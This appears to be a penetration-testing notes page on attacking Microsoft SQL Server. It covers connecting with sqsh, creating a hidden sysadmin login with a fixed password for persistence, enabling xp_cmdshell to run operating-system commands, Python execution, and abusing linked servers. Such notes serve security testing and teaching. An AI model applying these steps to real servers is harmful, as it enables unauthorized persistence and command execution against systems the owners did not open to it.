# MS-SQL Databases

MS-SQL or SQL Server is Microsoft's offering of an SQL Database. The syntax and model is quite similar to standard SQL with the benefit of being able to hook directly into offerings such as Windows Active Directory and interface with the Windows operating system. It is some of these features however that can allow us to get a strong foothold on a device.

There's a lot of fantastic tools and resources designed specifically for dealing with MS-SQL:

* [PowerUpSQL ](https://github.com/NetSPI/PowerUpSQL)- An enumeration and privilege escalation tool for MS-SQL in Powershell
* [msdat ](https://github.com/quentinhardy/msdat)- Microsoft SQL Database attacking tool
* [NetSPI Blog](https://blog.netspi.com/)
* [MS-SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

## Connecting

There are multiple ways to interface with an MS-SQL server.  If on Linux then I'd recommend using [sqsh](https://sourceforge.net/projects/sqsh/), as it's simple and allows you to quickly create commands:

```bash
sqsh -S 192.168.0.6 -U sa
```

However, I'd strongly recommend setting up a Windows VM and using [SQL Management Server](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-2017), as it allows you to quickly create scripts for enumeration and offers a graphical view for enumerating the database which can make extracting information much quicker.

## User Creation

For creating a sysadmin user to enable easy access to the database post-exploitation, we'll need to create a login and associated user for SQL authentication. We can then assign this user sysadmin privileges.

```sql
CREATE LOGIN booj WITH PASSWORD = 'B00j123!'
CREATE USER booj for LOGIN booj
EXEC sp_addsrvrolemember @loginame = N'booj', @rolename = N'sysadmin'
```

## xp\_cmdshell

It's easy to execute commands on the host operating system as the service account using xp\_cmdshell.  By default this is unfortunately disabled, and to re-enable and use it the SQL accounts requires sysadmin level privileges.

```sql
1> exec sp_configure 'show advanced options', 1
2> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. 
(return status = 0)
1> reconfigure
2> go
1> exec sp_configure 'xp_cmdshell', 1
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> reconfigure
2> go
1> exec master..xp_cmdshell 'whoami' 
2> go
```

## Python Code Execution

In some cases python code execution is available as part of an SQL transaction.  This obviously allows arbitary code execution, but the python interpreter is not always as locked down as xp\_cmdshell, which may allow further exploitation and privilege escalation.

#### References

[The Power of Python and SQL Server 2017](https://www.red-gate.com/simple-talk/sql/sql-development/power-python-sql-server-2017/)

## Server Links

The best reference for exploiting server links is [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server!](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/) They're not hard to pull off and can allow you to escalate your permissions quite easily. However, do note that you should absolutely use rpc\_out if it's enabled.

Since OpenQuery can only satisfy user queries, stored procedures or user creation is not possible and makes your escalation path much more difficult.

